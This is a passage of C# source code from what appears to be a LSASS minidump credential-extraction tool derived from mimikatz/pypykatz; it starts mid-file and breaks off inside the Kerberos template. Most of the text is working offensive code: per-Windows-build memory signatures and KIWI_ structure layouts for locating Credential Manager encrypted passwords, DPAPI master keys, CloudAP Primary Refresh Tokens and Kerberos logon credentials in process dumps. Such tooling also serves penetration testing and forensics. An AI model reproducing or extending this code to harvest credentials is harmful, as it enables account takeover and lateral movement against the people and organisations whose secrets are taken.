                    //Console.WriteLine($"Found MiscInfoStream {dir.Offset} {dir.Size} Size");
                    //misc_info = MinidumpMiscInfo.parse(dir, file_handle);
                    //Console.WriteLine(str(misc_info))
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.MemoryInfoListStream)
                {
                    //Console.WriteLine($"Found MemoryInfoListStream {dir.Offset} {dir.Size} Size");
                    //memory_info = MinidumpMemoryInfoList.parse(dir, file_handle);
                    //Console.WriteLine(str(memory_info))
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ThreadInfoListStream)
                {
                    //Console.WriteLine($"Found ThreadInfoListStream {dir.Offset} {dir.Size} Size");
                    //thread_info = MinidumpThreadInfoList.parse(dir, file_handle);
                    //Console.WriteLine(thread_info);
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.SystemMemoryInfoStream)
                {
                    //Console.WriteLine($"Found SystemMemoryInfoStream {dir.Offset} {dir.Size} Size");
                    //Console.WriteLine($"SystemMemoryInfoStream parsing is not implemented (Missing documentation)");
                    continue;
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.JavaScriptDataStream)
                {
                    //Console.WriteLine($"Found JavaScriptDataStream {dir.Offset} {dir.Size} Size");
                    //Console.WriteLine($"JavaScriptDataStream parsing is not implemented (Missing documentation)");
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.ProcessVmCountersStream)
                {
                    //Console.WriteLine($"Found ProcessVmCountersStream {dir.Offset} {dir.Size} Size");
                    //Console.WriteLine($"ProcessVmCountersStream parsing is not implemented (Missing documentation)");
                }
                else if (dir.StreamType == Directory.MINIDUMP_STREAM_TYPE.TokenStream)
                {
                    //Console.WriteLine($"Found TokenStream {dir.Offset} {dir.Size} Size");
                    //Console.WriteLine($"TokenStream parsing is not implemented (Missing documentation)");
                }
                else
                {
                    //Console.WriteLine($"Found Unknown Stream! Type {dir.StreamType}, {dir.Offset}, {dir.Size})");
                }
            }
            return 0;
        }
    }
}
```

`Streams/SystemInfo.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Minidump.Streams
{
    public class SystemInfo
    {
        [Flags]
        public enum PROCESSOR_ARCHITECTURE
        {
            AMD64 = 9,
            ARM = 5,
            IA64 = 6,
            INTEL = 0,
            AARCH64 = 0x8003,
            UNKNOWN = 0xffff
        }

        [Flags]
        public enum PROCESSOR_LEVEL
        {
            INTEL_80386 = 3,
            INTEL_80486 = 4,
            INTEL_PENTIUM = 5,
            INTEL_PENTIUM_PRO = 6
        }

        [Flags]
        public enum PRODUCT_TYPE
        {
            VER_UNIDENTIFIED_PRODUCT = 0x0000000,
            VER_NT_WORKSTATION = 0x0000001,
            VER_NT_DOMAIN_CONTROLLER = 0x0000002,
            VER_NT_SERVER = 0x0000003
        }

        [Flags]
        public enum PLATFORM_ID
        {
            VER_PLATFORM_WIN32s = 0,
            VER_PLATFORM_WIN32_WINDOWS = 1,
            VER_PLATFORM_WIN32_NT = 2,
            VER_PLATFORM_CRASHPAD_MAC = 0x8101,
            VER_PLATFORM_CRASHPAD_IOS = 0x8102,
            VER_PLATFORM_CRASHPAD_LINUX = 0x8201,
            VER_PLATFORM_CRASHPAD_SOLARIS = 0x8202,
            VER_PLATFORM_CRASHPAD_ANDROID = 0x8203,
            VER_PLATFORM_CRASHPAD_PS3 = 0x8204,
            VER_PLATFORM_CRASHPAD_NACL = 0x8205,
            VER_PLATFORM_CRASHPAD_FUSCHIA = 0x8206,
            VER_PLATFORM_CRASHPAD_UNKNOWN = 0xfffffff
        }

        [Flags]
        public enum WindowsBuild
        {
            WIN_XP = 2600,
            WIN_2K3 = 3790,
            WIN_VISTA = 6000,
            WIN_7 = 7600,
            WIN_8 = 9200,
            WIN_BLUE = 9600,
            WIN_10_1507 = 10240,
            WIN_10_1511 = 10586,
            WIN_10_1607 = 14393,
            WIN_10_1703 = 15063,
            WIN_10_1709 = 16299,
            WIN_10_1803 = 17134,
            WIN_10_1809 = 17763,
            WIN_10_1903 = 18362
        }

        [Flags]
        public enum WindowsMinBuild
        {
            WIN_XP = 2500,
            WIN_2K3 = 3000,
            WIN_VISTA = 5000,
            WIN_7 = 7000,
            WIN_8 = 8000,
            WIN_BLUE = 9400,
            WIN_10 = 9800
        }

        [Flags]
        public enum SUITE_MASK
        {
            VER_SUITE_BACKOFFICE = 0x00000004,
            VER_SUITE_BLADE = 0x00000400,
            VER_SUITE_COMPUTE_SERVER = 0x00004000,
            VER_SUITE_DATACENTER = 0x00000080,
            VER_SUITE_ENTERPRISE = 0x00000002,
            VER_SUITE_EMBEDDEDNT = 0x00000040,
            VER_SUITE_PERSONAL = 0x00000200,
            VER_SUITE_SINGLEUSERTS = 0x00000100,
            VER_SUITE_SMALLBUSINESS = 0x00000001,
            VER_SUITE_SMALLBUSINESS_RESTRICTED = 0x00000020,
            VER_SUITE_STORAGE_SERVER = 0x00002000,
            VER_SUITE_TERMINAL = 0x00000010
        }

        public struct MINIDUMP_SYSTEM_INFO
        {
            public PROCESSOR_ARCHITECTURE ProcessorArchitecture;
            public uint ProcessorLevel;
            public uint ProcessorRevision;
            public uint Reserved0;
            public uint NumberOfProcessors;
            public PRODUCT_TYPE ProductType;
            public uint MajorVersion;
            public uint MinorVersion;
            public uint BuildNumber;
            public PLATFORM_ID PlatformId;
            public uint CSDVersionRva;
            public int Reserved1;
            public SUITE_MASK SuiteMask;
            public int Reserved2;
            public List<uint> VendorId;
            public uint VersionInformation;
            public uint FeatureInformation;
            public uint AMDExtendedCpuFeatures;
            public List<UInt64> ProcessorFeatures;

            //for wrtier
            public uint CSDVersion;

            public int msv_dll_timestamp;
            public string OS;
        }

        public static MINIDUMP_SYSTEM_INFO Parse(BinaryReader fileBinaryReader)
        {
            MINIDUMP_SYSTEM_INFO msi = new MINIDUMP_SYSTEM_INFO();

            //msi.ProcessorArchitecture = Helpers.ReadUInt16(fileBinaryReader);
            msi.ProcessorArchitecture = (PROCESSOR_ARCHITECTURE)Enum.Parse(typeof(PROCESSOR_ARCHITECTURE),
                Enum.GetName(typeof(PROCESSOR_ARCHITECTURE), (int)Helpers.ReadUInt16(fileBinaryReader)));
            msi.ProcessorLevel = Helpers.ReadUInt16(fileBinaryReader);
            msi.ProcessorRevision = Helpers.ReadUInt16(fileBinaryReader);
            //the below field is present in the documentation from MSDN, however is not present in the actual dump
            //msi.Reserved0 = int.from_bytes(buff.read(2), byteorder = 'little', signed = False)
            msi.NumberOfProcessors = Helpers.ReadInt8(fileBinaryReader);
            //msi.ProductType = Helpers.ReadUInt8(fileBinaryReader);
            msi.ProductType = (PRODUCT_TYPE)Enum.Parse(typeof(PRODUCT_TYPE), Enum.GetName(typeof(PRODUCT_TYPE), (int)Helpers.ReadInt8(fileBinaryReader)));
            msi.MajorVersion = Helpers.ReadUInt32(fileBinaryReader);
            msi.MinorVersion = Helpers.ReadUInt32(fileBinaryReader);
            msi.BuildNumber = Helpers.ReadUInt32(fileBinaryReader);
            //msi.PlatformId = Helpers.ReadUInt32(fileBinaryReader);
            msi.PlatformId = (PLATFORM_ID)Enum.Parse(typeof(PLATFORM_ID), Enum.GetName(typeof(PLATFORM_ID), (int)Helpers.ReadUInt32(fileBinaryReader)));
            msi.CSDVersionRva = Helpers.ReadUInt32(fileBinaryReader);
            ////msi.Reserved1 = int.from_bytes(buff.read(4), byteorder = 'little', signed = False)
            ////msi.SuiteMask = Helpers.ReadUInt16(fileBinaryReader);
            int sm = Helpers.ReadUInt16(fileBinaryReader);
            try
            {
                msi.SuiteMask = (SUITE_MASK)Enum.Parse(typeof(SUITE_MASK), Enum.GetName(typeof(SUITE_MASK), sm));
            }
            catch (Exception e)
            { }
            msi.Reserved2 = Helpers.ReadUInt16(fileBinaryReader);
            if (msi.ProcessorArchitecture == PROCESSOR_ARCHITECTURE.INTEL)
            {
                foreach (var _ in Enumerable.Range(0, 3))
                {
                    msi.VendorId.Add(Helpers.ReadUInt32(fileBinaryReader));
                }

                msi.VersionInformation = Helpers.ReadUInt32(fileBinaryReader);
                msi.FeatureInformation = Helpers.ReadUInt32(fileBinaryReader);
                msi.AMDExtendedCpuFeatures = Helpers.ReadUInt32(fileBinaryReader);
            }
            else
            {
                foreach (var _ in Enumerable.Range(0, 2))
                {
                    //fix this
                    //msi.ProcessorFeatures.Add(Helpers.ReadUInt64(fileBinaryReader));
                }
            }

            return msi;
        }

        public static string guess_os(uint MajorVersion, uint MinorVersion, PRODUCT_TYPE ProductType)
        {
            string OperatingSystem = "";

            if (MajorVersion == 10 && MinorVersion == 0 &&
                ProductType == PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows 10";
            }
            else if (MajorVersion == 10 && MinorVersion == 0 &&
                     ProductType != PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Server 2016 Technical Preview";
            }
            else if (MajorVersion == 6 && MinorVersion == 3 &&
                     ProductType == PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows 8.1";
            }
            else if (MajorVersion == 6 && MinorVersion == 3 &&
                     ProductType != PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Server 2012 R2";
            }
            else if (MajorVersion == 6 && MinorVersion == 2 &&
                     ProductType == PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows 8";
            }
            else if (MajorVersion == 6 && MinorVersion == 2 &&
                     ProductType != PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Server 2012";
            }
            else if (MajorVersion == 6 && MinorVersion == 1 &&
                     ProductType == PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows 7";
            }
            else if (MajorVersion == 6 && MinorVersion == 1 &&
                     ProductType != PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Server 2008 R2";
            }
            else if (MajorVersion == 6 && MinorVersion == 0 &&
                     ProductType == PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Vista";
            }
            else if (MajorVersion == 6 && MinorVersion == 0 &&
                     ProductType != PRODUCT_TYPE.VER_NT_WORKSTATION)
            {
                OperatingSystem = "Windows Server 2008";
            }
            else if (MajorVersion == 5 && MinorVersion == 1)
            {
                // Can't accurately report on Windows Server 2003/R2
                // elif (MajorVersion == 5 and MinorVersion == 2 and ProductType == self.ProductType.VER_NT_WORKSTATION)
                //	self.OperatingSystem =  "Windows Vista"
                //elif (MajorVersion == 5 and MinorVersion == 2 and ProductType != self.ProductType.VER_NT_WORKSTATION)
                //	self.OperatingSystem =  "Windows Server 2008"
                OperatingSystem = "Windows XP";
            }
            else if (MajorVersion == 5 && MinorVersion == 0)
            {
                OperatingSystem = "Windows 2000";
            }

            return OperatingSystem;
        }

        public static MINIDUMP_SYSTEM_INFO parse(Directory.MINIDUMP_DIRECTORY dir, Program.MiniDump minidump)
        {
            minidump.fileBinaryReader.BaseStream.Seek(dir.Offset, 0);
            byte[] chunk = minidump.fileBinaryReader.ReadBytes((int)dir.Size);

            using (BinaryReader ChunkReader = new BinaryReader(new MemoryStream(chunk)))
            {
                MINIDUMP_SYSTEM_INFO si = Parse(ChunkReader);
                si.OS = guess_os(si.MajorVersion, si.MinorVersion, si.ProductType);
                return si;
            }
        }
    }
}
```

`Templates/cloudap_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class cloudap
    {
        public struct CloudapTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public int luidOffset;
            public int cacheOffset;
            public int cbPRTOffset;
            public int PRTOffset;
            public int tonameOffset;
            public Type list_entry;
        }

        public static CloudapTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            CloudapTemplate template = new CloudapTemplate();
            if (sysinfo.BuildNumber <= (int)SystemInfo.WindowsBuild.WIN_10_1903)
            {
                return template;
            }
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                template.signature = new byte[] { 0x44, 0x8b, 0x01, 0x44, 0x39, 0x42, 0x18, 0x75 };
                template.first_entry_offset = -9;
                template.list_entry = typeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY);
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                template.signature = new byte[] { 0x8b, 0x31, 0x39, 0x72, 0x10, 0x75 };
                template.first_entry_offset = -8;
                template.list_entry = typeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY);
            }
            else
            {
                throw new Exception(String.Format("Could not identify template! Architecture: %s sysinfo.BuildNumber: %s", sysinfo.ProcessorArchitecture, sysinfo.BuildNumber));
            }

            template.luidOffset = StructFieldOffset(template.list_entry, "LocallyUniqueIdentifier");
            template.cacheOffset = StructFieldOffset(template.list_entry, "cacheEntry");

            template.cbPRTOffset = StructFieldOffset(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY), "cbPRT");
            template.PRTOffset = StructFieldOffset(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY), "PRT");
            template.tonameOffset = StructFieldOffset(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY), "toname");

            return template;
        }
    }

    public struct KIWI_CLOUDAP_CACHE_UNK
    {
        public uint unk0;
        public uint unk1;
        public uint unk2;
        public uint unkSizeer;

        public Guid guid;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
        public byte[] unk;
    }

    public struct KIWI_CLOUDAP_CACHE_LIST_ENTRY
    {
        public long Flink;
        public long Blink;
        public uint unk0;
        public IntPtr LockList;
        public IntPtr unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr unk4;
        public IntPtr unk5;
        public uint unk6;
        public uint unk7;
        public uint unk8;
        public uint unk9;
        public IntPtr unkLogin0;
        public IntPtr unkLogin1;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 130)]
        public byte[] toname;

        public long Sid;

        public uint unk10;
        public uint unk11;
        public uint unk12;
        public uint unk13;

        //public KIWI_CLOUDAP_CACHE_UNK toDetermine;
        public ulong toDetermine;

        public IntPtr unk14;
        public uint cbPRT;
        public ulong PRT;
    }

    public struct KIWI_CLOUDAP_LOGON_LIST_ENTRY
    {
        public long Flink;
        public long Blink;
        public int unk0;
        public int unk1;
        public LUID LocallyUniqueIdentifier;
        public Int64 unk2;
        public Int64 unk3;
        public long cacheEntry;
    }
}
```

`Templates/credman_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class credman
    {
        public struct CredmanTemplate
        {
            public byte[] signature;
            public int offset;
            public Type list_entry;
        }

        public static CredmanTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            CredmanTemplate template = new CredmanTemplate();
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY_5);
                    template.offset = 0;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY_60);
                    template.offset = 0;
                }
                else
                {
                    template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY);
                    template.offset = 0;
                }
            }
            else if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
            {
                template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY_5_X86);
                template.offset = -32;
            }
            else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
            {
                template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY_60_X86);
                template.offset = -32;
            }
            else
            {
                template.list_entry = typeof(KIWI_CREDMAN_LIST_ENTRY_X86);
                template.offset = -32;
            }
            return template;
        }
    }

    //x64
    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public LIST_ENTRY unk4;
        public UNICODE_STRING type;
        public IntPtr unk5;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public IntPtr unk8;
        public IntPtr unk9;
        public IntPtr unk10;
        public UNICODE_STRING user;
        public uint unk11;
        public UNICODE_STRING server2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY_5
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public UNICODE_STRING user;
        public IntPtr unk8;
        public UNICODE_STRING server2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY_60
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public UNICODE_STRING type;
        public IntPtr unk5;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public IntPtr unk8;
        public IntPtr unk9;
        public IntPtr unk10;
        public UNICODE_STRING user;
        public IntPtr unk11;
        public UNICODE_STRING server2;
    }

    //x86
    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY_X86
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public LIST_ENTRY unk4;
        public UNICODE_STRING type;
        public IntPtr unk5;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public IntPtr unk8;
        public IntPtr unk9;
        public IntPtr unk10;
        public UNICODE_STRING user;
        public uint unk11;
        public UNICODE_STRING server2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY_5_X86
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public UNICODE_STRING user;
        public IntPtr unk8;
        public UNICODE_STRING server2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_ENTRY_60_X86
    {
        public uint cbEncPassword;
        public long encPassword;
        public uint unk0;
        public uint unk1;
        public IntPtr unk2;
        public IntPtr unk3;
        public IntPtr UserName;
        public uint cbUserName;
        public long Flink;
        public long Blink;
        public UNICODE_STRING type;
        public IntPtr unk5;
        public UNICODE_STRING server1;
        public IntPtr unk6;
        public IntPtr unk7;
        public IntPtr unk8;
        public IntPtr unk9;
        public IntPtr unk10;
        public UNICODE_STRING user;
        public IntPtr unk11;
        public UNICODE_STRING server2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_SET_LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
        public uint unk0;
        public IntPtr list1;
        public IntPtr list2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KIWI_CREDMAN_LIST_STARTER
    {
        private readonly uint unk0;
        public IntPtr start;
    }
}
```

`Templates/dpapi_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class dpapi
    {
        private const Int32 ANYSIZE_ARRAY = 1;

        public struct DpapiTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public object list_entry;
        }

        public static DpapiTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            DpapiTemplate template = new DpapiTemplate();
            template.list_entry = new KIWI_MASTERKEY_CACHE_ENTRY();
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85 };
                    template.first_entry_offset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.signature = new byte[] { 0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84 };
                    template.first_entry_offset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05 };
                    template.first_entry_offset = 7;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[]
                        {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
                    template.first_entry_offset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85 };
                    template.first_entry_offset = -10;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1507 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08 };
                    template.first_entry_offset = -7;
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08 };
                    template.first_entry_offset = 11;
                }
                else
                {
                    //currently doesnt make sense, but keeping it here for future use
                    throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
                }
            }
            else if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if (sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x33, 0xc0, 0x40, 0xa3 };
                    template.first_entry_offset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber &&
                         sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84 };
                    template.first_entry_offset = -16;
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x33, 0xc0, 0x40, 0xa3 };
                    template.first_entry_offset = -4;
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {sysinfo.ProcessorArchitecture}");
            }

            return template;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MASTERKEY_CACHE_ENTRY
        {
            public long Flink;
            public long Blink;
            public LUID LogonId;
            public Guid KeyUid;
            public FILETIME insertTime;
            public uint keySize;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
            public byte[] key;
        }
    }
}
```

`Templates/kerberos_templates.cs`:

```cs
using Minidump.Streams;
using System;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Templates
{
    public class kerberos
    {
        public struct KerberosTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public int LogonSessionTypeSize;
            public Type LogonSessionType;
            public Type PrimaryCredentialType;
            public int SessionCredentialOffset;
            public int SessionUserNameOffset;
            public int SessionDomainOffset;
            public int SessionPasswordOffset;
        }

        public static KerberosTemplate get_template(SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo)
        {
            KerberosTemplate template = new KerberosTemplate();
            if (sysinfo.ProcessorArchitecture == SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x48, 0x3b, 0xfe, 0x0f, 0x84 };
                    template.first_entry_offset = -4;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x48, 0x3b, 0xfe, 0x0f, 0x84 };
                    template.first_entry_offset = -4;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1507 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1511)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1511 <= sysinfo.BuildNumber && sysinfo.BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10);
                    template.LogonSessionTypeSize = Marshal.SizeOf(typeof(KIWI_KERBEROS_LOGON_SESSION_10));
                    template.PrimaryCredentialType = typeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL);
                }
                else if (sysinfo.BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1607)
                {
                    template.signature = new byte[] { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
                    template.first_entry_offset = 6;
                    template.LogonSessionType = typeof(KIWI_KERBEROS_LOGON_SESSION_10_1607);
